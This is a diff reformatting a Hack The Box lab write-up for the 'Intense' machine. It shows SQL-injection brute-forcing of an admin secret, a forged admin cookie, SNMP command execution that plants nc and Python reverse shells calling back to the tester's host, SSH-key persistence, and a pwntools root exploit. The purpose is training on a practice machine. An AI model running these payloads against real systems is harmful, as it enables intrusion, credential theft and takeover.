@@ -1,10 +1,8 @@
-
-
 # HTB - Intense
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/6a3e25b8957399691d3aa9c575baa3c419c9aba4/linux-machines/hard/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with - Linux hard difficulty
 
@@ -12,11 +10,11 @@ Short description to include any strange things to be dealt with - Linux hard di
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
@@ -28,21 +26,19 @@ only port 22 and port 80 were open
 
 port 80
 
-> Hello !
-> You can login with the username and password guest.
-
-
-> This app is opensource ! 
+> Hello ! You can login with the username and password guest.
+>
+> This app is opensource !
 
 Has link to `src.zip`
 
-> One day, an old man said "there is no point using automated tools, better to craft his own". 
+> One day, an old man said "there is no point using automated tools, better to craft his own".
 
 Hint that automated tools will not work here?
 
 found input box that seemed to hint at sql injection vulnerability
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ tree app         
 app
@@ -50,52 +46,52 @@ app
 ├── app.py
 ├── lwt.py
 ├── static
-│   ├── css
-│   │   └── style.css
-│   ├── img
-│   │   ├── app-bg.png
-│   │   ├── apple-touch-icon.png
-│   │   ├── arrow1.png
-│   │   ├── arrow2.png
-│   │   ├── favicon.png
-│   │   ├── intro01.png
-│   │   ├── intro02.png
-│   │   ├── intro03.png
-│   │   ├── item-01.png
-│   │   ├── item-02.png
-│   │   └── mobile.png
-│   ├── js
-│   │   └── main.js
-│   └── lib
-│       ├── bootstrap
-│       │   ├── css
-│       │   │   ├── bootstrap.css
-│       │   │   └── bootstrap.min.css
-│       │   ├── fonts
-│       │   │   ├── glyphicons-halflings-regular.eot
-│       │   │   ├── glyphicons-halflings-regular.svg
-│       │   │   ├── glyphicons-halflings-regular.ttf
-│       │   │   ├── glyphicons-halflings-regular.woff
-│       │   │   └── glyphicons-halflings-regular.woff2
-│       │   └── js
-│       │       ├── bootstrap.js
-│       │       └── bootstrap.min.js
-│       ├── easing
-│       │   ├── easing.js
-│       │   └── easing.min.js
-│       ├── jquery
-│       │   ├── jquery.js
-│       │   └── jquery.min.js
-│       └── php-mail-form
-│           └── validate.js
+│   ├── css
+│   │   └── style.css
+│   ├── img
+│   │   ├── app-bg.png
+│   │   ├── apple-touch-icon.png
+│   │   ├── arrow1.png
+│   │   ├── arrow2.png
+│   │   ├── favicon.png
+│   │   ├── intro01.png
+│   │   ├── intro02.png
+│   │   ├── intro03.png
+│   │   ├── item-01.png
+│   │   ├── item-02.png
+│   │   └── mobile.png
+│   ├── js
+│   │   └── main.js
+│   └── lib
+│       ├── bootstrap
+│       │   ├── css
+│       │   │   ├── bootstrap.css
+│       │   │   └── bootstrap.min.css
+│       │   ├── fonts
+│       │   │   ├── glyphicons-halflings-regular.eot
+│       │   │   ├── glyphicons-halflings-regular.svg
+│       │   │   ├── glyphicons-halflings-regular.ttf
+│       │   │   ├── glyphicons-halflings-regular.woff
+│       │   │   └── glyphicons-halflings-regular.woff2
+│       │   └── js
+│       │       ├── bootstrap.js
+│       │       └── bootstrap.min.js
+│       ├── easing
+│       │   ├── easing.js
+│       │   └── easing.min.js
+│       ├── jquery
+│       │   ├── jquery.js
+│       │   └── jquery.min.js
+│       └── php-mail-form
+│           └── validate.js
 ├── templates
-│   ├── admin.html
-│   ├── footer.html
-│   ├── header.html
-│   ├── home.html
-│   ├── index.html
-│   ├── login.html
-│   └── submit.html
+│   ├── admin.html
+│   ├── footer.html
+│   ├── header.html
+│   ├── home.html
+│   ├── index.html
+│   ├── login.html
+│   └── submit.html
 └── utils.py
 
 13 directories, 38 files
@@ -107,21 +103,21 @@ from admin.py found a few paths to check out; the admin page was forbidden, the 
 
 Looks like I will need an admin token
 
-Looking at the reqest to the page there is a cookie header 
+Looking at the reqest to the page there is a cookie header
 
-```
+```text
 Cookie: auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.7B6PiygW8lDO84yRQABGvGfw0ttyTDTwk0h+GEEFpgI=
 ```
 
 decoded the base64
 
-```
+```text
 Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;ì(òPÎó@
 ```
 
-the auth cookie contains the username, a secret, and some kind of binary garbage appended to the string; I needed a way to get the secret for a user `admin` (from the source code)
+the auth cookie contains the username, a secret, and some kind of binary garbage appended to the string; I needed a way to get the secret for a user `admin` \(from the source code\)
 
-```
+```text
 from flask import Flask, request, render_template, g, redirect, url_for,\
     make_response
 from utils import get_db, get_session, get_user, try_login, query_db, badword_in_str
@@ -207,10 +203,9 @@ if __name__ == "__main__":
     app.run()
 ```
 
-.py contained a few interesting methods; submit message restricted the messages to les than 140 chars and also does some sort of "bad word" check to filter input. Afterwards it places the message in the database;  I decided to check for SQL injection
+.py contained a few interesting methods; submit message restricted the messages to les than 140 chars and also does some sort of "bad word" check to filter input. Afterwards it places the message in the database; I decided to check for SQL injection
 
-
-```
+```text
 from hashlib import sha256
 from base64 import b64decode, b64encode
 from random import randrange
@@ -275,7 +270,7 @@ def create_cookie(session):
 
 lwt.py contained
 
-```
+```text
 import lwt
 import sqlite3
 from hashlib import sha256
@@ -389,33 +384,31 @@ def admin_list_log(logdir):
     if not path.exists(f"logs/{logdir}"):
         return f"Can't find {logdir}"
     return listdir(logdir)
-
 ```
 
-utils.py also contained some interesting methods; the method `is_admin()` teslls me that the `admin` user has a role of `1`; `get_user()` and `try_login()` give me some example SQL queries to test; `badword_in_str()` gives me a list of filtered words `["rand", "system", "exec", "date"]`.  Looks like I will not be able to execute code with my SQL injection
+utils.py also contained some interesting methods; the method `is_admin()` teslls me that the `admin` user has a role of `1`; `get_user()` and `try_login()` give me some example SQL queries to test; `badword_in_str()` gives me a list of filtered words `["rand", "system", "exec", "date"]`. Looks like I will not be able to execute code with my SQL injection
 
 picture
 
-Pulling information from utils.py I crafted the query: `' AND select secret from users where username = admin and role =1` 
+Pulling information from utils.py I crafted the query: `' AND select secret from users where username = admin and role =1`
 
 and it looked like I was getting an error that points towards a SQL injection vulnerability; now I just had to find out what kind of query would return either the password or secret
 
 `a') UNION SELECT password FROM users --` results in `no such column: password`, but substituting password with secret makes the message get submitted to the database with no return
 
-https://stackoverflow.com/questions/62803167/how-to-make-the-sql-injection-on-insert-work-on-sqlite
+[https://stackoverflow.com/questions/62803167/how-to-make-the-sql-injection-on-insert-work-on-sqlite](https://stackoverflow.com/questions/62803167/how-to-make-the-sql-injection-on-insert-work-on-sqlite)
 
-https://stackoverflow.com/questions/15513854/sqlite3-warning-you-can-only-execute-one-statement-at-a-time
+[https://stackoverflow.com/questions/15513854/sqlite3-warning-you-can-only-execute-one-statement-at-a-time](https://stackoverflow.com/questions/15513854/sqlite3-warning-you-can-only-execute-one-statement-at-a-time)
 
-apparently the errors I have been getting while inserting a semicolon were because you can only execute one query at a time.  The first link above supplies a work-around for this problem
+apparently the errors I have been getting while inserting a semicolon were because you can only execute one query at a time. The first link above supplies a work-around for this problem
 
-> Ok so I've spent some time working on this and there is a way to make it work. You can interrogate sqlite on queries like: "SELECT CASE WHEN (SELECT SUBSTRING(password, 1, 1)) = 'a' THEN 1 END". You can write a simple python script that changes the 1 inside substring and the 'a' char. In this way you can pretty much bruteforce the output of the column. – RobertM Jul 16 at 19:11
+> Ok so I've spent some time working on this and there is a way to make it work. You can interrogate sqlite on queries like: "SELECT CASE WHEN \(SELECT SUBSTRING\(password, 1, 1\)\) = 'a' THEN 1 END". You can write a simple python script that changes the 1 inside substring and the 'a' char. In this way you can pretty much bruteforce the output of the column. – RobertM Jul 16 at 19:11
 
 I seems like I will have to bruteforce each character of the secret string using python
 
-https://www.sqlitetutorial.net/sqlite-case/
+[https://www.sqlitetutorial.net/sqlite-case/](https://www.sqlitetutorial.net/sqlite-case/)
 
-was encountering a problem with my output only matching zero for the secret until I searched for SQLite3 error-based injection and found 
-https://translate.google.com/translate?hl=en&sl=ru&u=https://rdot.org/forum/showthread.php%3Fp%3D26419&prev=search
+was encountering a problem with my output only matching zero for the secret until I searched for SQLite3 error-based injection and found [https://translate.google.com/translate?hl=en&sl=ru&u=https://rdot.org/forum/showthread.php%3Fp%3D26419&prev=search](https://translate.google.com/translate?hl=en&sl=ru&u=https://rdot.org/forum/showthread.php%3Fp%3D26419&prev=search)
 
 ```bash
 ┌──(zweilos㉿kali)-[~/htb/intense]
@@ -429,14 +422,13 @@ to test my theory I used Burp' Intruder to test a brute force of all alpha-numer
 
 pics
 
-I was successful, and found that the first character in the admin's secret was `'f'`.  From this I used python to write a brute force program to iterate through all 64 characters in the secret
+I was successful, and found that the first character in the admin's secret was `'f'`. From this I used python to write a brute force program to iterate through all 64 characters in the secret
 
-To get all alpha-numeric chars: https://stackoverflow.com/questions/5891453/is-there-a-python-library-that-contains-a-list-of-all-the-ascii-characters
+To get all alpha-numeric chars: [https://stackoverflow.com/questions/5891453/is-there-a-python-library-that-contains-a-list-of-all-the-ascii-characters](https://stackoverflow.com/questions/5891453/is-there-a-python-library-that-contains-a-list-of-all-the-ascii-characters)
 
-To print output dynamically on one line: https://stackoverflow.com/questions/3249524/print-in-one-line-dynamically
+To print output dynamically on one line: [https://stackoverflow.com/questions/3249524/print-in-one-line-dynamically](https://stackoverflow.com/questions/3249524/print-in-one-line-dynamically)
 
-To get the runtime of a program or method: https://stackoverflow.com/questions/1557571/how-do-i-get-time-of-a-python-programs-execution
-
+To get the runtime of a program or method: [https://stackoverflow.com/questions/1557571/how-do-i-get-time-of-a-python-programs-execution](https://stackoverflow.com/questions/1557571/how-do-i-get-time-of-a-python-programs-execution)
 
 ```python
 import requests
@@ -472,7 +464,7 @@ print("--- %s seconds ---" % (time.time() - start_time))
 
 My finalized python script
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ python3 ./secret-brute-force.py 
 Iterating through all 64 chars in the secret: 
@@ -483,14 +475,15 @@ Total runtime:
 
 the whole brute force went pretty quick! I added a timer to test it, and it took less than 50 seconds to go through the whole string
 
-```
+```text
 auth=username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;ÉBCJ±ØèÅÞ
 b¾nTÁu µí§
 sm`Æ
 ```
+
 crafted my new auth cookie, then base64 it `dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7yUJDSrHY6MXeDWIMvm6WVBrBiI11ILXthKcNc22KYMY=`
 
-Using this cookie however broke the whole site, and made it so no pages would load.  I figured it had something to do with the unreadable characters that were appended to the end of the secret in the cookie.  
+Using this cookie however broke the whole site, and made it so no pages would load. I figured it had something to do with the unreadable characters that were appended to the end of the secret in the cookie.
 
 ```python
 def sign(msg):
@@ -526,7 +519,7 @@ def parse_session(cookie):
     return info
 ```
 
-going back to lwt.py gave me the answer.  the data after the `';'` was a signature created by running sha256 on secret + MSG
+going back to lwt.py gave me the answer. the data after the `';'` was a signature created by running sha256 on secret + MSG
 
 ```python
 def create_cookie(session):
@@ -534,33 +527,31 @@ def create_cookie(session):
     return b64encode(session) + b'.' + b64encode(cookie_sig)
 ```
 
-to create the signature I needed to run the create_cookie() method above to encode and sign the username and secret
+to create the signature I needed to run the create\_cookie\(\) method above to encode and sign the username and secret
 
-https://github.com/bwall/HashPump
+[https://github.com/bwall/HashPump](https://github.com/bwall/HashPump)
 
-the final admin cookie was 
+the final admin cookie was
 
-```
+```text
 dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQO3VzZXJuYW1lPWFkbWluO3NlY3JldD1mMWZjMTIwMTBjMDk0MDE2ZGVmNzkxZTE0MzVkZGZkY2FlY2NmODI1MGUzNjYzMGMwYmM5MzI4NWMyOTcxMTA1Ow==.IZp1w+kV4OqLepjmgjxZR6/bcZXtV138PqZiZdxNoGg=
 ```
 
 for some reason the hashpumpy module added the guest cookie to the admin cookie, then appended the signature of the both
 
-```
-Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;.!uÃéàêzæ<YG¯ÛqíW]ü>¦beÜM h
+```text
+Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;.!uÃéàêzæ<YG¯ÛqíW]ü>¦beÜM h
 ```
 
 the `admin.py` mentions using the `logfile` and `logdir` properties, along with the POST method after logging in as admin
 
 through burp was able to get /etc/passwd; only two users can login, root and user
 
-
-
 ## Initial Foothold
 
-in /etc/passwd noticed debian_snmp so decided to see what I could find on that service
+in /etc/passwd noticed debian\_snmp so decided to see what I could find on that service
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195                                                   2 ⚙
 SNMPv2-MIB::sysDescr.0 = STRING: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
@@ -593,11 +584,11 @@ SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notificatio
 SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
 ```
 
-https://digi.ninja/blog/snmp_to_shell.php
+[https://digi.ninja/blog/snmp\_to\_shell.php](https://digi.ninja/blog/snmp_to_shell.php)
 
 installed snmp MIBs
 
-```
+```text
 snmpwalk:
 
 snmpwalk -v 2c -c <community-string> host-with-snmpd.lan
@@ -610,7 +601,7 @@ echo "" > /etc/snmp/snmp.conf
 
 Not much information gained from SNMP walk
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendOutput1                             130 ⨯ 2 ⚙
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
@@ -624,24 +615,21 @@ NET-SNMP-EXTEND-MIB::nsExtendResult."test1" = INTEGER: 0
 NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
 ```
 
-https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e
+[https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e](https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e)
 
-> snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c <read-write-community-string> \
-    host-with-snmpd.lan \
-    'nsExtendStatus."command"'  = createAndGo \
-    'nsExtendCommand."command"' = /bin/echo \
-    'nsExtendArgs."command"'    = 'hello world'
+> snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c   host-with-snmpd.lan  'nsExtendStatus."command"' = createAndGo  'nsExtendCommand."command"' = /bin/echo  'nsExtendArgs."command"' = 'hello world'
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/bin/nc 10.10.15.100 55541 -e /bin/bash' 'nsExtendArgs."command"'    = 'hello world' 
 NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
 NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/nc 10.10.15.100 55541 -e /bin/bash
 NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: hello world
 ```
+
 created my command to send nc reverse shell
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendOutput1                                   2 ⚙
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
@@ -665,18 +653,19 @@ NET-SNMP-EXTEND-MIB::nsExtendResult."command" = INTEGER: 1
 
 Unfortunately the isntalled version of nc did not have `-e` functionality
 
-
 ## Road to User
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/usr/bin/python3' 'nsExtendArgs."command"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.15.100\",55541));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"' 
 NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
 NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /usr/bin/python3
 NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.15.100\",55541));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"
 ```
-connected to my 
-```
+
+connected to my
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendOutput1                                   2 ⚙
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
@@ -695,16 +684,17 @@ NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."command" = INTEGER: 4
 NET-SNMP-EXTEND-MIB::nsExtendResult."test1" = INTEGER: 0
 NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
 NET-SNMP-EXTEND-MIB::nsExtendResult."command" = INTEGER: 1
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendOutput1                                   2 ⚙
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
 Timeout: No Response from 10.10.10.195
 ```
+
 after trying a few things realized that some of the internal quotes needed to be escaped for it to run properly
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ nc -lvnp 55541                              
 listening on [any] 55541 ...
@@ -714,14 +704,14 @@ id && hostname
 uid=111(Debian-snmp) gid=113(Debian-snmp) groups=113(Debian-snmp)
 intense
 ```
+
 got a shell back on my waiting nc listener
 
-a strange problem I encountered with this snmp terminal...if I lose my shell I lose the ability to connect to this box.  Not sure why or how, but resetting the machine does not help, and it took two resets of my connection pack and my local machine to get it to work again.  I thought I had lost all connection to HTB, but after it happened again a few days later I tried pinging a known active box (I think I had accidentally tried pinging a box that is inactive, leading me to believe I lost my whole connection)
+a strange problem I encountered with this snmp terminal...if I lose my shell I lose the ability to connect to this box. Not sure why or how, but resetting the machine does not help, and it took two resets of my connection pack and my local machine to get it to work again. I thought I had lost all connection to HTB, but after it happened again a few days later I tried pinging a known active box \(I think I had accidentally tried pinging a box that is inactive, leading me to believe I lost my whole connection\)
 
 ### Further enumeration
 
 ### Finding user creds
-
 
 ### User.txt
 
@@ -729,7 +719,7 @@ a strange problem I encountered with this snmp terminal...if I lose my shell I l
 
 ### Enumeration as `Debian-snmp`
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ nc -lvnp 55541
 listening on [any] 55541 ...
@@ -784,9 +774,9 @@ Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
 10.10.15.100 - - [07/Nov/2020 18:26:00] "GET /user.txt HTTP/1.1" 200 -
 ```
 
-Downloaded a few interesting files from `user`'s home folder...then lost my shell again when I cancelled the http server (right after I realized I should have put my ssh key there!)
+Downloaded a few interesting files from `user`'s home folder...then lost my shell again when I cancelled the http server \(right after I realized I should have put my ssh key there!\)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/bin/bash' 'nsExtendArgs."command"' = "-c \"/bin/echo ${ssh_key} >> ~/.ssh/authorized_keys\""
 NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
@@ -796,7 +786,7 @@ NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "/bin/echo ecdsa-sha2-n
 
 I tried echoing my ssh key to `user` but got a permission denied error, so I tried to see if I could do the same for the `Debian-snmp` user, and got partial success
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ ssh -i intense.key Debian-snmp@10.10.10.195                                                   255 ⨯
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
@@ -823,16 +813,17 @@ Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
 
 Last login: Tue Jun 30 09:34:08 2020 from 10.10.14.2
 Connection to 10.10.10.195 closed.
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ ssh -i intense.key Debian-snmp@10.10.10.195 "bash --noprofile --norc"                           1 ⨯
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ ssh -i intense.key Debian-snmp@10.10.10.195 "/bin/sh"
 ```
-I was successful in copying my key, but I wasn't able to login and get a shell.  I tried a few bypass methods, but it seemed as if they had it locked down.  
 
-```
+I was successful in copying my key, but I wasn't able to login and get a shell. I tried a few bypass methods, but it seemed as if they had it locked down.
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@10.10.10.195 -i intense.key
 ```
@@ -841,7 +832,7 @@ I was able to use SSH to create a tunnel to the machine without running any comm
 
 ### Getting a shell
 
-```
+```text
 Debian-snmp@intense:/home/user$ ps -u root
 ps -u root
    PID TTY          TIME CMD
@@ -921,9 +912,9 @@ ps -u root
 
 note-server was running as root
 
-note: had to get help with this, not good with binary exploitation - thank you to ippsec for his amazing walkthrough videos; also the official write-up for the final working script.  For some reason I wasnt able to get gdb's breakpoints to work. It kept giving me an error when running after setting a break point on the write@plt address
+note: had to get help with this, not good with binary exploitation - thank you to ippsec for his amazing walkthrough videos; also the official write-up for the final working script. For some reason I wasnt able to get gdb's breakpoints to work. It kept giving me an error when running after setting a break point on the write@plt address
 
-```
+```text
 0x0000000000000d27 <+541>:   callq  0x900 <write@plt>
    0x0000000000000d2c <+546>:   nop
    0x0000000000000d2d <+547>:   mov    -0x8(%rbp),%rax
@@ -945,7 +936,7 @@ Cannot insert breakpoint 2.
 Cannot access memory at address 0xd27
 ```
 
-kept getting errors when trying to set break points in gdb.  I got frustrated with this and moved on to other machines until the box retired and I was able to watch Ippsec's video, and in the end used the exploit from the official write-up.
+kept getting errors when trying to set break points in gdb. I got frustrated with this and moved on to other machines until the box retired and I was able to watch Ippsec's video, and in the end used the exploit from the official write-up.
 
 `gdb ./note_server -ex 'set follow-fork-mode child' -ex 'break 82' -ex 'run'`
 
@@ -1025,7 +1016,7 @@ p.interactive()
 
 ### Root.txt
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ python3 ./pwn-note_server2.py
 [*] '/home/zweilos/htb/intense/note_server'
@@ -1054,6 +1045,4 @@ b3e42063bf6316157da49cbfae5e21d7
 Thanks to [`sokafr`](https://app.hackthebox.eu/users/19014) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
-
-
 
